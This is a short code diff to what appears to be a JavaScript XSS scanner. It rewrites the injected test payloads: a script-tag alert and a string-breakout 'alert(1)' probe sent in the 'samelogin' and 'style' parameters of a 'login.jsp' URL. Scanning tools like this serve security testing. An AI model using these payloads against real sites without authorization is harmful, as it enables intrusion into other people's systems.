@@ -126,7 +126,9 @@ function fnDoCheckUrl(szUrl,fnCbk1)
 	if(g_bSkip && xss_Oks && -1 < xss_Oks.indexOf(szUrl))return;
 	// http://1.1.1.1
 	szUrl = szUrl.substr(0,14) + szUrl.substr(14).replace(/[^\/\.]+\?.*?$/gmi,'');
-	var url = szUrl,szOurl = url, req = fnGetRequest(request),  s = "<" + g_ScrIpt + ">alert(" + new Date().getTime() + ")</" + g_ScrIpt + ">";
+	var url = szUrl,szOurl = url, req = fnGetRequest(request),  
+	// new payload 
+		s =  "<" + g_ScrIpt + ">alert(" + new Date().getTime() + ")</" + g_ScrIpt + ">";
 	// console.log([url, szOurl])
 	// 寻找注入点
 	fnDoReq(req,{uri:szOurl,
@@ -180,7 +182,9 @@ function fnDoCheckUrl(szUrl,fnCbk1)
 	if(url)
 		url = url.replace(/\/[^\/]*$/gmi, "/");
 	// encodeURIComponent
-	var sxPay = ("null\";</" + g_ScrIpt + ">" + s);
+	s = 'null"}alert(1);if(1){//';
+	var sxPay = encodeURIComponent(s);//("null\";</" + g_ScrIpt + ">" + s);
+	
 	url = aH + url + "/login.jsp?samelogin=" + sxPay + "&style=" + sxPay;
 	//console.log(url)
 	fnDoReq(req,{uri:url},function(b,headers)
